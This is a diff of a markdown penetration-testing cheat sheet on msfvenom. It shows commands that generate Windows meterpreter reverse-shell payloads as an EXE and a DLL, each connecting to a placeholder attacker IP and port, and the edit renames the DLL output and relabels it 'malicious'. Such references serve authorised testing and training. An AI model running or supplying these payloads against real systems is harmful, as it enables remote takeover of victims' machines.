@@ -32,9 +32,10 @@ Payloads naming convention : \[OS\]/\[arch\]/\[payload\]
  > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o </font>shell<font color=red>.exe</font>**</br>
  > Generate a meterpreter reverse shell exe.
 
+
  > 
- > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> shell<font color=red>.dll</font>**</br>
- > Generate a meterpreter reverse shell DLL.
+ > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**</br>
+ > Generate a malicious DLL (meterpreter reverse shell).
 
 ## MSFVENOM Windows Shellcode (Buffer Overflow)
 
